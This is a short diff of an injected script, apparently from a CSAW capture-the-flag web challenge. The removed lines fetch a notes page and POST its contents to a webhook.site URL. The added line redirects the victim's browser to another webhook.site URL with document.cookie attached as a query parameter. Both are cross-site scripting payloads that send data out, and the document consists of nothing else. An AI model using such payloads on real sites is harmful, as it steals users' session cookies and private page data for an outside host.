@@ -1,8 +1,3 @@
 <script>
-    fetch("https://rainbow-notes.csaw.io").then((res) => res.text()).then((res) => {
-        fetch("https://webhook.site/bfc96ffe-8abc-4839-963e-0b52865eadb2", {
-            method: "POST",
-            body: res
-        })
-    })
+    window.location=`https://webhook.site/ada87e9c-ad1d-471b-960e-0e0dcd8b75ac/?flag=${document.cookie}`
 </script>
